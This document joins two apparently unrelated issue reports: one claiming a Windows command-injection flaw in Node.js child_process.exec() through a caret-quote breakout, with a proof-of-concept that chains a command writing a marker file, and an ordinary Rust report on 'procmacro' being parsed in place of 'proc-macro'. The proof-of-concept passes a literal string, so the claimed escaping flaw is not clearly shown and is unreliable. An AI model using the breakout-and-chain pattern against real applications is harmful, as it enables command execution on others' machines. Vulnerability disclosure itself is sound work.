child_process.exec() Windows caret-quote breakout - Command Injection (RCE)

## child_process.exec() Windows ^" Quote Breakout — Command Injection

### Summary

`child_process.exec()` on Windows wraps the user-supplied command string in `cmd.exe /d /s /c "..."` without escaping embedded `^"` (caret+quote), allowing breakout and arbitrary command injection. Unlike `spawn({shell:true})`, `exec()` does NOT emit DEP0190 deprecation warning.

### Steps to Reproduce

```javascript
const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const marker = path.join(os.tmpdir(), 'exec_rce.txt');
try { fs.unlinkSync(marker); } catch(e) {}

// ^" breaks out of exec()'s outer quote, & chains command
execSync('echo "hello^" & echo RCE_SUCCESS > "' + marker + '"');
console.log('RCE:', fs.existsSync(marker)); // true
console.log('Content:', fs.readFileSync(marker, 'utf8').trim()); // RCE_SUCCESS
```

### Impact

Any application passing user input to `child_process.exec()` on Windows is vulnerable to command injection. No DEP0190 warning is emitted, unlike `spawn({shell:true})`.

### Environment

Node.js v24.22.1 (win32 x64)

### Note

This is reported via GitHub issue because HackerOne requires identity verification (7-day wait). Happy to re-report via HackerOne once verified if preferred.

From<&String> for CrateType parses "procmacro" instead of "proc-macro"

### Problem
&String to CrateType conversion incorrectly matches "proc-macro" crate types as `CrateType::Other` instead of `CrateType::ProcMacro`.
```rust
impl<'a> From<&'a String> for CrateType {
    fn from(s: &'a String) -> Self {
        match s.as_str() {
            ...
            "procmacro" => CrateType::ProcMacro,
            _ => CrateType::Other(s.clone()),
        }
    }
}
```

`CrateType.as_str` contains the correct conversion, meaning round trip CrateType -> &String -> CrateType fails.
```rust
impl CrateType {
    pub fn as_str(&self) -> &str {
        match self {
            ...
            CrateType::ProcMacro => "proc-macro",
            CrateType::Other(s) => s,
        }
    }
```

Additionally, rustc does not understand the string "procmacro":
```
% rustc --crate-type procmacro pm.rs
error: unknown crate type: `procmacro`, expected one of: `lib`, `rlib`, `staticlib`, `dylib`, `cdylib`, `bin`, `proc-macro`
```
